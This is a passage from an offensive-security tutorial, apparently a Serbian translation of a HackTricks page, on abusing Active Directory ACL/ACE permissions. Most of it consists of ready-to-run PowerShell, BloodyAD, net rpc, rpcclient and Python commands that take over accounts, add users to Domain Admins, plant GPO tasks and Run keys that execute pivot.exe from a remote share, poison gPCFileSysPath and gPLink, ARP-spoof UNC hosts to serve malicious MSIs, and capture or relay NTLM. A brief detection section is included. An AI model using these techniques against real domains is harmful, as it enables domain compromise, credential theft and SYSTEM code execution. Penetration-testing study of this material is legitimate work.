# Zloupotreba Active Directory ACL-ova/ACE-ova

{{#include ../../../banners/hacktricks-training.md}}

**Ova stranica je uglavnom sažetak tehnika iz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Za više detalja pogledajte izvorne članke.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

Za zloupotrebu ACL-ova nad obrisanim objektima i ponovno aktiviranje naloga pogledajte [ponovno aktiviranje naloga pomoću AD Recycle Bin-a](../privileged-groups-and-token-privileges.md#reanimating-a-deleted-account-through-delegated-acls).

## **Prava GenericAll nad korisnikom**

Ova privilegija napadaču daje potpunu kontrolu nad ciljnim korisničkim nalogom. Kada se pomoću komande `Get-ObjectAcl` potvrde prava `GenericAll`, napadač može da:

- **Promeni lozinku ciljnog naloga**: Pomoću komande `net user <username> <password> /domain`, napadač može da resetuje lozinku korisnika.
- Sa Linux-a, isto se može uraditi preko SAMR-a pomoću Samba komande `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Ako je nalog onemogućen, uklonite UAC zastavicu**: `GenericAll` omogućava uređivanje `userAccountControl`. Sa Linuxa, BloodyAD može da ukloni zastavicu `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Dodelite SPN korisničkom nalogu kako biste ga učinili kerberoastable, a zatim koristite Rubeus i targetedKerberoast.py da izdvojite heševe ticket-granting ticket (TGT) i pokušate da ih razbijete.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Onemogućite prethodnu autentifikaciju za korisnika, čime njegov nalog postaje ranjiv na ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Sa `GenericAll` pravima nad korisnikom možete da dodate akreditive zasnovane na sertifikatu i da se autentifikujete kao taj korisnik bez promene njegove lozinke. Pogledajte:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll prava nad grupom**

Ova privilegija omogućava napadaču da menja članstvo u grupi ako ima `GenericAll` prava nad grupom kao što je `Domain Admins`. Nakon što pomoću `Get-NetGroup` utvrdi distinguished name grupe, napadač može da:

- **Doda sebe u grupu Domain Admins**: To se može uraditi direktnim komandama ili pomoću modula kao što su Active Directory ili PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Iz Linuxa možete koristiti i BloodyAD da biste se dodali u proizvoljne grupe kada imate GenericAll/Write prava nad njihovim članstvom. Ako je ciljna grupa ugnježdena u „Remote Management Users“, odmah ćete dobiti WinRM pristup hostovima koji poštuju članstvo u toj grupi:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write nad računarom/korisnikom**

Ove privilegije nad objektom računara ili korisničkim nalogom omogućavaju:

- **Kerberos Resource-based Constrained Delegation**: Omogućava preuzimanje kontrole nad objektom računara.
- **Shadow Credentials**: Koristite ovu tehniku da biste se predstavljali kao nalog računara ili korisnika, iskorišćavanjem privilegija za kreiranje shadow credentials.

## Premeštanje objekta u OU sa nasleđenim dozvolama

Putanja može da kombinuje **prava za premeštanje naloga** sa **pravima pisanja nasleđenim odredišnog OU-a**, čak i kada nijedan principal u početku ne može da menja osetljive atribute naloga. Proverite dozvole za premeštanje izvornog objekta i `CreateChild` na odredištu, premestite objekat, pa ponovo proverite njegov efektivni DACL. Na primer, `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` iz powerview.py premešta korisnika; kontrolisana grupa sa nasleđenim `GenericWrite` nad tim OU-om zatim može da doda [shadow credential](shadow-credentials.md). Samo premeštanje ne stvara nasleđeno pravo.<sup>[[18]](#references)</sup>

Ako imate `GenericAll` nad OU-om, ali ne i odgovarajući nasleđeni ACE, `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` može da doda takav ACE za njegove potomke. Zasebno testirajte ciljni nalog: **zaštićenim nalozima AdminSDHolder-a nasleđivanje je onemogućeno**, pa OU ACE može da utiče na obične korisnike, ali ne i na zaštićenog korisnika. Pogledajte [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Zasebna putanja zloupotrebe postoji kada privilegovana skripta za zakazano čišćenje bira OU-ove na osnovu ACE-ova na koje napadač može da utiče, a zatim nad njihovim potomcima pokreće `Set-ADObject -Clear adminCount` **i** `$acl.SetAccessRuleProtection($False, $False)`. Ako možete da menjate DACL OU-a, dodelite grupi koju skripta proverava potreban `ExtendedRight` ili `GenericAll` ACE; zasebno proverite da li možete da pokrenete zadatak. Privilegovani zadatak tada može da ponovo omogući nasleđivanje na prethodno zaštićenom nalogu, čime OU ACE počinje da se primenjuje. Potvrdite tačnu skriptu, dozvolu za pokretanje i rezultujući DACL; samo brisanje `adminCount` ne omogućava ponovo nasleđivanje, a SDProp može ponovo da zaštiti naloge koji ostanu u zaštićenim grupama.<sup>[[18]](#references)</sup>

## **WriteProperty nad grupom**

Ako korisnik ima prava `WriteProperty` nad svim objektima određene grupe (npr. `Domain Admins`), može da:

- **Doda sebe u grupu Domain Admins**: Ovo se može postići kombinovanjem komandi `net user` i `Add-NetGroupUser`, čime se omogućava eskalacija privilegija unutar domena.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) u grupi**

Ova privilegija omogućava napadačima da se sami dodaju u određene grupe, kao što je `Domain Admins`, pomoću komandi koje direktno menjaju članstvo u grupi. Sledeći niz komandi omogućava samostalno dodavanje:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Slična privilegija koja napadačima omogućava da se direktno dodaju u grupe izmenom svojstava grupe ako imaju pravo `WriteProperty` nad tim grupama. Provera i izvršavanje ove privilegije obavljaju se pomoću:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Posedovanje prava `ExtendedRight` nad korisnikom za `User-Force-Change-Password` omogućava resetovanje lozinke bez poznavanja trenutne lozinke. Provera ovog prava i njegovo iskorišćavanje mogu se obaviti pomoću PowerShell-a ili alternativnih alata komandne linije, koji nude nekoliko načina za resetovanje korisničke lozinke, uključujući interaktivne sesije i jednolinijske komande za neinteraktivna okruženja. Komande se kreću od jednostavnih PowerShell poziva do korišćenja alata `rpcclient` na Linux-u, pokazujući raznovrsnost vektora napada.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner nad grupom**

Ako napadač otkrije da ima prava `WriteOwner` nad grupom, može da promeni vlasnika grupe i postavi sebe za vlasnika. Ovo je naročito značajno kada je reč o grupi `Domain Admins`, jer promena vlasnika omogućava širu kontrolu nad atributima i članstvom grupe. Postupak podrazumeva pronalaženje odgovarajućeg objekta pomoću `Get-ObjectAcl`, a zatim korišćenje komande `Set-DomainObjectOwner` za promenu vlasnika, navođenjem SID-a ili imena.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite nad korisnikom**

Ova dozvola omogućava napadaču da menja svojstva korisnika. Konkretno, uz `GenericWrite` pristup, napadač može da promeni putanju skripte za prijavu korisnika kako bi se pri njegovoj prijavi izvršila zlonamerna skripta. To se postiže korišćenjem komande `Set-ADObject` za ažuriranje svojstva `scriptpath` ciljnog korisnika tako da pokazuje na skriptu napadača.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Uži `WriteProperty` ACE ograničen na korisnikov atribut [`scriptPath`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) može biti dovoljan; `GenericWrite` nije potreban. Uparite tu dozvolu za atribut sa skriptom u koju može da se upisuje, smeštenom u stablu `SYSVOL\<domain>\scripts` ili `NETLOGON` domena, a zatim procenite da li će se ciljni korisnik verovatno prijaviti i doći do skripte. Skripta se pokreće u kontekstu tog korisnika prilikom prijave. Zasebno proverite efektivne AD i ACL-ove za datoteke/deljenja; odgovarajući Allow ACE ili direktorijum u koji može da se upisuje sami po sebi ne potvrđuju da je ceo put moguć.

## **GenericWrite on Group**

Sa ovom privilegijom, napadači mogu da manipulišu članstvom u grupi, na primer dodavanjem sebe ili drugih korisnika u određene grupe. Ovaj postupak podrazumeva kreiranje credential objekta, njegovu upotrebu za dodavanje korisnika u grupu ili njihovo uklanjanje iz nje i proveru promena članstva pomoću PowerShell komandi.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Sa Linuxa, Samba `net` može da dodaje/uklanja članove ako imate `GenericWrite` nad grupom (korisno kada PowerShell/RSAT nisu dostupni):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Posedovanje AD objekta i posedovanje privilegija `WriteDACL` nad njim omogućava napadaču da sebi dodeli privilegije `GenericAll` nad objektom. To se postiže manipulacijom pomoću ADSI-ja, čime se omogućava potpuna kontrola nad objektom i mogućnost izmene članstva u njegovim grupama. Ipak, postoje ograničenja pri pokušaju zloupotrebe ovih privilegija pomoću cmdlet-a `Set-Acl` / `Get-Acl` iz Active Directory modula.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Brzo preuzimanje naloga pomoću WriteDACL/WriteOwner (PowerView)

Kada imate `WriteOwner` i `WriteDacl` nad korisnikom ili servisnim nalogom, možete preuzeti potpunu kontrolu i resetovati njegovu lozinku pomoću PowerView-a, a da ne znate staru lozinku:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Napomene:
- Možda ćete prvo morati da promenite vlasnika tako da vi postanete vlasnik, ako imate samo `WriteOwner`:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Proverite pristup pomoću bilo kog protokola (SMB/LDAP/RDP/WinRM) nakon resetovanja lozinke.

## **Replikacija domena (DCSync)**

DCSync napad koristi određene dozvole za replikaciju na domenu kako bi se imitirao Domain Controller i sinhronizovali podaci, uključujući korisničke akreditive. Ova moćna tehnika zahteva dozvole kao što je `DS-Replication-Get-Changes`, koje napadačima omogućavaju da izvuku osetljive informacije iz AD okruženja bez direktnog pristupa Domain Controller-u.<sup>[[5]](#references)</sup> [**Saznajte više o DCSync napadu ovde.**](../dcsync.md)

## Delegiranje GPO-a <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegiranje GPO-a

Delegirani pristup za upravljanje Group Policy Objects (GPOs) može predstavljati značajan bezbednosni rizik. Na primer, ako se korisniku kao što je `offense\spotless` dodele prava za upravljanje GPO-ovima, on može dobiti privilegije kao što su **WriteProperty**, **WriteDacl** i **WriteOwner**. Ove dozvole mogu se zloupotrebiti u zlonamerne svrhe, što se može otkriti pomoću PowerView-a: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Nabrajanje dozvola za GPO

Da biste identifikovali pogrešno konfigurisane GPO-ove, možete ulančati cmdlet-e iz PowerSploit-a. Tako se mogu otkriti GPO-ovi kojima određeni korisnik ima dozvolu da upravlja: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Računari na kojima je primenjena određena politika**: Možete utvrditi na koje se računare primenjuje određeni GPO, što pomaže u razumevanju potencijalnog dometa uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Politike primenjene na određeni računar**: Da biste videli koje se politike primenjuju na određeni računar, možete koristiti komande kao što je `Get-DomainGPO`.

**OU-ovi na koje je primenjena određena politika**: Organizacione jedinice (OU-ovi) na koje utiče određena politika možete identifikovati pomoću `Get-DomainOU`.

Možete koristiti i alat [**GPOHound**](https://github.com/cogiceo/GPOHound) za nabrajanje GPO-ova i pronalaženje problema u njima.

### Zloupotreba GPO-a - New-GPOImmediateTask

Pogrešno konfigurisani GPO-ovi mogu se iskoristiti za izvršavanje koda, na primer, kreiranjem neposrednog zakazanog zadatka. To se može iskoristiti za dodavanje korisnika u grupu lokalnih administratora na pogođenim računarima, čime se znatno podižu privilegije:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy modul - zloupotreba GPO-a

Modul GroupPolicy, ako je instaliran, omogućava kreiranje i povezivanje novih GPO-ova, kao i podešavanje preferenci, poput vrednosti registra, radi izvršavanja backdoor-a na pogođenim računarima. Ovaj metod zahteva ažuriranje GPO-a i prijavljivanje korisnika na računar da bi se izvršio:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Zloupotreba GPO-a

SharpGPOAbuse nudi način za zloupotrebu postojećih GPO-ova dodavanjem zadataka ili menjanjem podešavanja, bez potrebe za kreiranjem novih GPO-ova. Ovaj alat zahteva izmenu postojećih GPO-ova ili korišćenje RSAT alata za kreiranje novih pre primene izmena:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Prinudno ažuriranje politika

Ažuriranja GPO-a se obično dešavaju na svakih 90 minuta. Da bi se ovaj proces ubrzao, naročito nakon primene neke izmene, na ciljnom računaru može se koristiti komanda `gpupdate /force` za trenutno ažuriranje politike. Ova komanda osigurava da se sve izmene GPO-a primene bez čekanja na sledeći automatski ciklus ažuriranja.

### Ispod haube

Pregledom planiranih zadataka za dati GPO, kao što je `Misconfigured Policy`, može se potvrditi dodavanje zadataka poput `evilTask`. Ovi zadaci se kreiraju pomoću skripti ili alata komandne linije za izmenu ponašanja sistema ili eskalaciju privilegija.

Struktura zadatka, prikazana u XML konfiguracionoj datoteci koju generiše `New-GPOImmediateTask`, navodi pojedinosti planiranog zadatka — uključujući komandu koja će se izvršiti i njene okidače. Ova datoteka pokazuje kako se planirani zadaci definišu i upravljaju unutar GPO-a, omogućavajući izvršavanje proizvoljnih komandi ili skripti kao dela primene politike.

### Korisnici i grupe

GPO-ovi omogućavaju i izmenu članstva korisnika i grupa na ciljnim sistemima. Direktnim uređivanjem datoteka politike za korisnike i grupe, napadači mogu dodati korisnike u privilegovane grupe, kao što je lokalna grupa `administrators`. To je moguće kada su delegirane dozvole za upravljanje GPO-om, što omogućava izmenu datoteka politike radi dodavanja novih korisnika ili promene članstva u grupama.

XML konfiguraciona datoteka za korisnike i grupe opisuje kako se ove izmene sprovode. Dodavanjem unosa u ovu datoteku, određenim korisnicima mogu se dodeliti povišene privilegije na svim pogođenim sistemima. Ovaj metod omogućava direktnu eskalaciju privilegija manipulacijom GPO-om.

Za bezbednosne postavke kao što su članstvo u lokalnim grupama i korisnička prava, pregledajte i primenjeni GPO predložak na putanji `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` i ACL direktorijuma `SecEdit`. Direktorijum ili datoteka sa dozvolom za upis predstavlja povod za dalju proveru: stvarni pristup deljenom resursu SYSVOL, zabranjujuće i nasleđene ACL-ove, dozvole Group Policy kontejnera, opseg politike i osvežavanje klijenata i dalje određuju da li izmena može da stupi na snagu. Samo članstvo u grupi pod nazivom „GPO Managers” ne dokazuje da postoje dozvole za uređivanje. [Microsoft dokumentuje putanju do ovog predloška i podelu između Group Policy kontejnera i predloška.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Pored toga, mogu se razmotriti i drugi načini za izvršavanje koda ili održavanje postojanosti, kao što su korišćenje skripti za prijavu/odjavu, izmena ključeva registratora za automatsko pokretanje, instaliranje softvera putem .msi datoteka ili uređivanje konfiguracija servisa. Ove tehnike pružaju različite mogućnosti za održavanje pristupa i kontrolu ciljnih sistema zloupotrebom GPO-a.

### Preusmeravanje preuzimanja GPC/GPT-a ka lažnim servisima koji zahtevaju autentifikaciju

GPO se sastoji od LDAP **Group Policy kontejnera (GPC)** sa metapodacima i SMB-om hostovanog **Group Policy predloška (GPT)** sa datotekama politike. Tokom osvežavanja, klijent prati `gPLink` kontejnera, čita referencirani GPC i njegov `gPCFileSysPath`, a zatim preuzima GPT sa te UNC putanje. Zbog toga se pristup za upis u sam GPC ili u `gPLink` OU-a, lokacije ili domena može iskoristiti za pokretanje privilegovane obrade politike.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Trovanje `gPCFileSysPath` pomoću GPOddity

Ako kontrolisani principal može da upisuje u ciljni GPC (direktno ili putem **NTLM relay to LDAP**), zameni `gPCFileSysPath` UNC putanjom koju hostuje napadač. [GPOddity](https://github.com/synacktiv/GPOddity) automatizuje izmenu LDAP-a i služi zlonamerni GPT koji sadrži datoteke politike zasnovane na modulima ili Immediate Task, koji Group Policy klijent izvršava kao `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Anonimni SMB deljeni resurs ili onaj koji ne proverava akreditive nije dovoljan na aktuelnim Windows klijentima: SMB Secure Negotiate zahteva dokaz da je autentifikacija uspela, pa lažni servis mora da potvrdi identitet domena, izvede SMB ključ sesije i ispravno potpisuje svoje odgovore. U ugrađenom režimu, konfigurišite GPOddity pomoću kontrolisanog mašinskog naloga i njegovog servisnog ključa, a zatim izaberite korisni teret na strani računara ili korisnika u odeljku `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Granični slučaj korisničkog GPO-a:** nakon MS16-072, Windows i dalje kreira dve SMB2 sesije unutar **iste TCP veze**: korisnička sesija čita `GPT.INI`, a zatim sesija računarskog naloga čita efektivnu konfiguraciju, kao što je `ScheduledTasks.xml`. Zato lažni server mora da indeksira stanje autentifikacije, ključeve sesije i ključeve za potpisivanje po SMB2 `SessionId`, a ne samo po socketu. Fork Scapy-ja ugrađen u GPOddity/OUned ovo implementira pomoću `SMBStreamSocketMultiplexing` i `SMBServer`-a koji podržava multipleksiranje; serveri Impacket/Scapy koji podržavaju samo jednu sesiju u suprotnom ponovo koriste pogrešno stanje za potpisivanje i ne uspevaju sa korisničkim pravilima.<sup>[[15]](#references)</sup>

#### Trovanje `gPLink`-a pomoću OUned

Uz `WriteGPLink`, `GenericWrite` ili ekvivalentnu kontrolu nad OU-om, Site-om ili Domain-om, napadač može da doda vezu čiji GPC DN opslužuje LDAP host pod kontrolom napadača. Ovu primitivu je prvobitno predstavio Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) automatizuje LDAP upis i zlonamerni GPC/GPT lanac.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Žrtva se najpre autentifikuje na lažnom LDAP servisu i dobija GPC čiji `gPCFileSysPath` pokazuje na lažni SMB servis; zatim se autentifikuje na SMB i primenjuje dostavljeni GPT. Zato je OUned-u potreban nalog sa LDAP SPN-om, računarski nalog sa HOST SPN-om za SMB (isti računarski nalog može zadovoljiti oba uslova) i DNS razrešavanje ili prosleđivanje unazad koje usmerava portove 389 i 445 ka hostu operatora.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned-ov ugrađeni Scapy LDAP server proverava Kerberos/SPNEGO pomoću stvarnog ključa kontrolisane usluge i isporučuje proizvoljne GPC podatke iz JSON-a. Prazan JSON ključ modeluje rootDSE, prefiksi `base64:` predstavljaju binarne vrednosti, a server podržava add/delete/modify/search operacije i pretrage `BASE`, `LEVEL` i `SUBTREE`; može da pregovara o odsustvu zaštite, integritetu ili poverljivosti. Zbog toga se ova usluga može ponovo koristiti kada neka druga Windows komponenta prati LDAP referencu pod kontrolom napadača, ali zahteva autentifikovani LDAP.<sup>[[15]](#references)</sup>

Nemojte pretpostaviti da sinhronizacija lozinke naloga u dummy domen reprodukuje svaki Kerberos ključ: RC4 se izvodi iz lozinke, dok AES string-to-key koristi i salt izveden iz hostname-a/domena principala. Prosleđivanje stvarnog AES ključa naloga u `KerberosSSP` izbegava nametanje RC4 putem uočljive izmene `msDS-SupportedEncryptionTypes` mašinskog naloga, koji može sam da ga upisuje.<sup>[[15]](#references)</sup>

#### Pokazatelji za detekciju

Korelirajte izmene atributa `gPCFileSysPath` ili `gPLink` sa promenama verzije GPO-a i novim Immediate/Scheduled Task XML datotekama. Istražite veze ka neočekivanim kontekstima imenovanja, UNC hostove izvan odobrenog skupa DC/SYSVOL, DNS zapise koji preusmeravaju imena mašinskih naloga, LDAP/CIFS servisne tikete za neuobičajene mašinske naloge i izmene `msDS-SupportedEncryptionTypes` koje omogućavaju RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + otmica UNC putanje (ARP spoofing)

`WriteGPLink` nad OU-om/domenom omogućava izmenu atributa `gPLink` ciljnog kontejnera i **prisilnu primenu postojećeg GPO-a** bez izmene samog GPO-a. Ovo je zanimljivo kada povezani GPO već upućuje na udaljeni sadržaj preko **UNC putanja** (`\\HOST\share\...`), jer autentifikovani korisnici mogu da čitaju **SYSVOL** i van mreže traže politike koje se mogu ponovo iskoristiti.<sup>[[11]](#references)</sup>

Radni tok na visokom nivou:

1. Pomoću BloodHound-a pronađite principal sa `WriteGPLink` nad OU-om i nabrojte računare/korisnike unutar tog OU-a.
2. Napravite kopiju `SYSVOL` direktorijuma samo za čitanje i raščlanite GPO-ove tražeći **Software Installation**, **mapiranja diskova** (`Drives.xml`) i **logon/startup skripte** koje upućuju na UNC putanje.
3. Dajte prednost politikama koje upućuju na **direktni hostname** (na primer `\\DC02\share\pkg.msi`) umesto na DFS/putanje imenskog prostora domena, jer je lakše preusmeriti putanje zasnovane na hostname-u pomoću L2 spoofing-a.
4. Dodajte GUID izabranog GPO-a u `gPLink` ciljnog OU-a kako bi žrtva obradila tu već postojeću politiku.
5. Na istom broadcast domenu, izvršite ARP spoofing UNC hosta i lokalno dodelite njegovu IP adresu (`ip addr add <target_ip>/32 dev <iface>`) kako bi SMB saobraćaj žrtve stigao do vašeg hosta.
6. Isporučite očekivanu putanju/naziv datoteke sa napadačevog SMB servera (na primer `smbserver.py`) i sačekajte uobičajenu obradu politike.

Primer prikupljanja `SYSVOL` direktorijuma i korelacije GPO-a:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Povežite postojeći GPO sa ciljnom OU:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Ako povezani GPO instalira MSI iz UNC putanje, klijent će ga preuzeti tokom **pokretanja računara** i instalirati kao **`NT AUTHORITY\SYSTEM`**. Lažiranjem navedenog hosta i posluživanje zlonamernog MSI-ja pod **istim deljenim resursom/putanjom/nazivom**, možete pretvoriti `WriteGPLink` u izvršavanje koda kao SYSTEM **bez menjanja SYSVOL-a**.

Važna ograničenja:

- **Vreme je važno**: nova veza se uočava pri osvežavanju smernica (obično za ~90 minuta), ali se **Software Installation** obično pokreće pri **ponovnom pokretanju**.
- Windows Installer obično prati instalaciju pomoću **`ProductCode`** paketa. Ako je proizvod već instaliran, instalacija može biti preskočena.
- Da biste izbegli odbijanje instalacije, izmenite lažni MSI tako da se njegov **`ProductCode`** i **`PackageCode`** podudaraju sa legitimnim paketom koji GPO očekuje.
- Stare `.aas` datoteke za oglašavanje mogu ostati u `SYSVOL`-u, zato proverite da li instalacija i dalje deluje aktivno pre nego što se oslonite na nju.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP mapiranja disk jedinica u `Drives.xml` dovode do toga da se korisnici autentifikuju na konfigurisanu UNC putanju prilikom prijavljivanja ili ponovnog povezivanja. Ako lažirate navedeni host, možete uhvatiti **NetNTLMv2**. Ako se SMB namerno onemogući, Windows može pokušati ponovo preko **WebDAV-a** i poslati **NTLM preko HTTP-a**, što omogućava znatno fleksibilniji relay ka **LDAP(S)**, **AD CS** ili **SMB**.

#### Logon/startup script UNC hijack

Isti obrazac važi za skripte hostovane na UNC putanji, otkrivene u `SYSVOL`:

- **Logon skripte** se obično izvršavaju u kontekstu **korisnika**.
- **Startup skripte** se obično izvršavaju u kontekstu **računara / SYSTEM**.

Ako putanja skripte upućuje na hostname koji se može lažirati, preusmerite UNC host i poslužite zamenski sadržaj skripte sa očekivane lokacije.

## Trovanje logon skripti u SYSVOL/NETLOGON

Putanje u `\\<dc>\SYSVOL\<domain>\scripts\` ili `\\<dc>\NETLOGON\` koje omogućavaju upisivanje dopuštaju menjanje logon skripti koje se izvršavaju prilikom prijavljivanja korisnika putem GPO-a. To omogućava izvršavanje koda u bezbednosnom kontekstu korisnika koji se prijavljuju.

### Pronalaženje logon skripti
